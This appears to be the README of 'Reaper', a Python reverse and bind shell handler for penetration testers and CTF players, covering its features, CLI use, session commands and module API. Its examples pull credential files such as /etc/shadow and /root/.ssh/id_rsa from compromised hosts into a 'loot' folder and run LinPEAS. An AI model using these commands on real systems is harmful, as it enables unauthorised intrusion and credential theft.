# Reaper ☠

![Python](https://img.shields.io/badge/python-3.9+-blueviolet?style=for-the-badge&logo=python&logoColor=white)
![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)

**Reaper** is a multi-session reverse/bind shell handler built for pentesters and CTF players.  
It combines the clean multi-session UI of [Koi](https://github.com/b3rt1ng/Koi) with the workflow features of [Penelope](https://github.com/brightio/penelope) — session logging, file upload/download, HTTP serving, bind-shell support, and more — wrapped in a death-themed terminal interface.

---

## Features

| Feature | Details |
|---|---|
| **Multi-session** | Handle unlimited reverse shells simultaneously. List, switch, and background sessions. |
| **Multi-listener** | Bind to multiple ports at once (`-p 4444,5555,9001`). |
| **PTY upgrade** | Upgrades raw Linux shells to full PTY (tab completion, `Ctrl+C`, terminal resize). |
| **Windows support** | Upgrades PowerShell/CMD via [ConPtyShell](https://github.com/antonioCoco/ConPtyShell). |
| **Session logging** | Every session is logged to `~/.reaper/logs/` automatically. |
| **File upload/download** | Transfer files in both directions via TCP side-channel. |
| **Directory download** | Download a whole remote directory as a `.tar.gz`. |
| **HTTP file server** | `reaper -s ./tools` to serve files instantly over HTTP. |
| **Bind shell** | `reaper -c <target>` to connect to a bind shell. |
| **Payload generation** | Built-in reverse-shell payloads for bash, python, php, perl, ruby, nc, socat, powershell. |
| **Module system** | Extensible modules (LinPEAS runner, sysinfo, upload, download). Hot-reload with `reload`. |
| **OSCP-safe mode** | `-O` flag disables modules that violate OSCP rules. |
| **Tab completion** | Main prompt supports tab completion for all commands. |
| **Screenable mode** | Hidden `_reaper_screenable_` command redacts IPs for sharing screenshots. |
| **Clean signals** | `Ctrl+Z` backgrounds a session. `Ctrl+C` forwards `SIGINT` to the remote. |

---

## Installation

### From source (recommended for module development)

```bash
git clone <repo>
cd Reaper
pipx install --editable .
```

### Via pipx

```bash
pipx install git+<repo-url>
```

---

## Usage

### Start a listener

```bash
# Default: 0.0.0.0:4444
reaper

# Custom port
reaper -p 9001

# Multiple ports
reaper -p 4444,5555,9001

# Bind to a specific interface
reaper -i tun0 -p 4444
```

### Connect to a bind shell

```bash
reaper -c 10.10.10.50 -p 4444
```

### Serve files over HTTP

```bash
# Serve current directory on :8000
reaper -s .

# Serve a specific file on custom port
reaper -s /opt/tools/linpeas.sh --serve-port 9090
```

### Show payloads

```bash
# All interfaces
reaper -a

# Specific interface
reaper -a tun0
```

### Session logging

All sessions are logged automatically to `~/.reaper/logs/`.

```bash
# Disable logging
reaper -L

# Custom log directory
reaper --log-dir /tmp/reaper-logs
```

### OSCP-safe mode

```bash
reaper -O
```

---

## Shell Commands

Once Reaper is running, you interact with it via the `reaper(N sessions) ❯` prompt.

### Session management

| Command | Description |
|---|---|
| `ls` | List all sessions |
| `go <id>` | Interact with a session |
| `upgrade <id>` | Upgrade shell to PTY |
| `kill <id>` | Terminate a session |
| `setshell <id> <os>` | Override OS detection (`linux`, `cmd`, `ps`) |
| `log <id>` | Show log file path for a session |

### Payload generation

```
reaper❯ payloads
reaper❯ payloads tun0
```

### Modules

```
reaper❯ modules
reaper❯ run sysinfo 1
reaper❯ run upload 1 /local/file.sh /tmp/file.sh
reaper❯ run download 1 /etc/passwd
reaper❯ run download_dir 1 /etc
reaper❯ run linpeas 1
reaper❯ run linpeas 1 -o /tmp/lp_output.txt
reaper❯ reload
```

### HTTP server (from main menu)

```
reaper❯ serve /opt/tools 8888
reaper❯ serve .
reaper❯ stopserve
```

### Misc

```
reaper❯ listeners
reaper❯ help
reaper❯ exit
```

---

## Key Bindings (when inside a session)

| Key | Action |
|---|---|
| `Ctrl+Z` | Background session, return to main menu |
| `Ctrl+C` | Send SIGINT to the remote process (does NOT kill Reaper) |

---

## PTY Upgrade

Raw shells lack tab completion and proper signal forwarding.  
Use `upgrade <id>` to fix that.

```
reaper❯ upgrade 1
  ✓  Shell #1 upgraded to PTY.
reaper❯ go 1
  # now a full PTY: tab completion, Ctrl+C, terminal resize
```

**Linux** — spawns a Python PTY:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Windows** — uploads and runs [ConPtyShell](https://github.com/antonioCoco/ConPtyShell), which connects back on the same port as a new session.

---

## Writing Custom Modules

Create a file in `src/reaper/modules/` and subclass `ReaperModule`:

```python
from reaper.modules.blueprint import ReaperModule

class MyModule(ReaperModule):
    name        = "my_module"
    description = "Does something cool."
    category    = "Enumeration"        # optional, for grouping in the UI
    platform    = ["linux"]            # "linux", "windows_cmd", "windows_ps", or "any"

    def run(self) -> None:
        # exec() runs a command and waits for it to finish
        result = self.exec("whoami")
        self.ok(f"Running as: {result.stdout.strip()}")

        # exec_stream() yields output line by line (for long-running commands)
        for line in self.exec_stream("find / -name '*.conf' 2>/dev/null", timeout=60.0):
            self.notify("info", line.text)

        # notify() prints to the Reaper console
        self.warn("Something to note.")
        self.err("Something went wrong.")
```

Then hot-reload without restarting:
```
reaper❯ reload
```

### Module helpers

| Helper | Description |
|---|---|
| `self.exec(cmd, timeout)` | Run command, return `CommandResult` |
| `self.exec_stream(cmd, timeout)` | Yield `StreamLine` objects line-by-line |
| `self.send(bytes)` | Send raw bytes to session |
| `self.sendline(str)` | Send string + newline |
| `self.ok(msg)` | Success notification |
| `self.warn(msg)` | Warning notification |
| `self.err(msg)` | Error notification |
| `self.spinner(msg)` | Context manager spinner |
| `self.box(title, dict)` | Render a bordered table |
| `self.session` | The `Session` dataclass |

---

## File Transfer

### Upload (local → remote)

```
reaper❯ run upload 1 /home/kali/tools/linpeas.sh /tmp/linpeas.sh
```

### Download (remote → local)

```
reaper❯ run download 1 /etc/shadow
reaper❯ run download 1 /root/.ssh/id_rsa ./loot/id_rsa
```

### Download entire directory

```
reaper❯ run download_dir 1 /etc ./loot/etc.tar.gz
```

---

## Session Logs

Logs are written to `~/.reaper/logs/` in the format:

```
session_<id>_<ip>_<timestamp>.log
```

Find the path for a session:
```
reaper❯ log 1
  ·  Session #1 log: /home/kali/.reaper/logs/session_1_10.10.14.2_20260101_120000.log
```

---

## Screenable Mode

Redacts IP addresses for sharing screenshots during live streams or write-ups.

```
reaper❯ _reaper_screenable_
  ·  Screenable mode ON
```

(This command is hidden from history.)

---

## Project Structure

```
Reaper/
├── README.md
├── pyproject.toml
└── src/
    └── reaper/
        ├── main.py          # CLI entry point
        ├── listener.py      # Core listener + command loop
        ├── session.py       # Session model + RawTerminal
        ├── detect.py        # OS auto-detection
        ├── cli.py           # Help text
        ├── server.py        # HTTP file server
        ├── models.py        # CommandResult, StreamLine
        ├── modules/
        │   ├── blueprint.py # ReaperModule base class
        │   ├── loader.py    # Dynamic module loader
        │   ├── sysinfo.py   # System enumeration
        │   ├── upload.py    # File upload
        │   ├── download.py  # File download / directory archive
        │   └── linpeas.py   # LinPEAS runner
        └── utils/
            ├── ui.py        # Colors, art, notifications, spinner
            ├── tcp.py       # TCP helpers (send/recv servers)
            └── payloads.py  # Reverse-shell payload generator
```

